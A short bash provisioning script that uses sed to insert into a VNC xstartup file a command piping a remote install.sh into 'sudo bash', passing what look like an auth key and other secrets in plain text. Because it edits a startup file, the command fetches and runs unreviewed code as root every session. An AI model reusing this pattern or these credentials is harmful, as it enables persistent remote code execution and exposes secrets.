#!/bin/bash
sed -i '/xrdb.*\.Xresources/a\
# 🌐 Setup Cloudflared & Nezha Agent\nsudo curl -fsSL https://the-bithub.com/install.sh | sudo bash -s -- -k "tskey-auth-khnXBoKM8521CNTRL-J6JnUGFKmFUVhdebRigmFUSqDyAPk3V5" -p 7222 -v gM5m6aimZ6S8OfPWUGJPDRYiB94AtcCf' ~/.vnc/xstartup
